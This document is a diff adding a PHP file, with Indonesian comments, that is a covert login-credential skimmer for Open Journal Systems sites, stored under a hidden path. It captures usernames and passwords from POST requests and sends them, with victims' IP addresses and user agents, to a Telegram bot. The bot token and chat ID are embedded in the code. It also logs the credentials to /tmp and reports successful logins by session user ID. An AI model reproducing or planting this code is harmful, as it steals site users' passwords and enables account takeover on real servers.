@@ -1,0 +1,119 @@
+<?php
+/**
+ * OJS LOGIN CAPTURE - SIMPLE & STABLE
+ * File: /dev/shm/.ojs_capture
+ */
+
+// ============================================
+// KONFIGURASI TELEGRAM
+// ============================================
+$bot_token = '8859521729:AAFishpLzFMIPd8bDotaujqJV-NRLXMTq3c';
+$chat_id = '8259867883';
+
+// ============================================
+// CEK APAKAH INI HALAMAN LOGIN (HINDARI LOAD BERAT)
+// ============================================
+$request_uri = $_SERVER['REQUEST_URI'] ?? '';
+$is_login_page = (strpos($request_uri, 'login') !== false || 
+                   strpos($request_uri, 'signIn') !== false ||
+                   strpos($request_uri, 'admin') !== false);
+
+// ============================================
+// CAPTURE LOGIN (HANYA JIKA ADA POST)
+// ============================================
+$username = '';
+$password = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Tangkap credentials
+    if (isset($_POST['username']) && isset($_POST['password'])) {
+        $username = $_POST['username'];
+        $password = $_POST['password'];
+    }
+    elseif (isset($_POST['email']) && isset($_POST['password'])) {
+        $username = $_POST['email'];
+        $password = $_POST['password'];
+    }
+    elseif (isset($_POST['user']) && isset($_POST['pass'])) {
+        $username = $_POST['user'];
+        $password = $_POST['pass'];
+    }
+    elseif (isset($_POST['login']) && isset($_POST['pwd'])) {
+        $username = $_POST['login'];
+        $password = $_POST['pwd'];
+    }
+    
+    // Kirim notifikasi jika ada credential
+    if (!empty($username) && !empty($password)) {
+        
+        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? 
+              $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
+              $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+        
+        if (strpos($ip, ',') !== false) {
+            $ip = trim(explode(',', $ip)[0]);
+        }
+        
+        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+        $full_path = $_SERVER['REQUEST_URI'] ?? '/';
+        $time = date('Y-m-d H:i:s');
+        $host = $_SERVER['HTTP_HOST'] ?? 'unknown';
+        
+        // STATUS SEMENTARA (ATTEMPT dulu)
+        $message = "🔐 OJS LOGIN ATTEMPT\n";
+        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        $message .= "👤 USERNAME: {$username}\n";
+        $message .= "🔑 PASSWORD: {$password}\n";
+        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        $message .= "🌐 IP: {$ip}\n";
+        $message .= "📍 PATH: {$full_path}\n";
+        $message .= "⏰ TIME: {$time}\n";
+        $message .= "🌍 HOST: {$host}\n";
+        $message .= "📱 UA: " . substr($user_agent, 0, 60);
+        
+        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
+        $post_data = "chat_id={$chat_id}&text=" . urlencode($message);
+        
+        if (function_exists('curl_init')) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_exec($ch);
+            curl_close($ch);
+        }
+        
+        // Log ke file
+        $log_entry = "[{$time}] ATTEMPT|{$username}|{$password}|{$ip}|{$full_path}\n";
+        @file_put_contents('/tmp/ojs_capture.log', $log_entry, FILE_APPEND);
+    }
+}
+
+// ============================================
+// DETEKSI LOGIN SUCCESS VIA COOKIE (TAMBAHAN)
+// ============================================
+// Kirim notifikasi success jika ada cookie session BARU dan sebelumnya tidak ada
+session_start();
+if (!empty($_SESSION)) {
+    // Cek apakah ini user yang baru login
+    if (isset($_SESSION['userId']) && !isset($_SESSION['_notified'])) {
+        $_SESSION['_notified'] = true;
+        
+        $user_id = $_SESSION['userId'];
+        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+        $time = date('Y-m-d H:i:s');
+        
+        $message = "✅ OJS LOGIN SUCCESS\n";
+        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+        $message .= "👤 USER ID: {$user_id}\n";
+        $message .= "🌐 IP: {$ip}\n";
+        $message .= "⏰ TIME: {$time}";
+        
+        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage?chat_id={$chat_id}&text=" . urlencode($message);
+        @file_get_contents($url);
+    }
+}
+?>
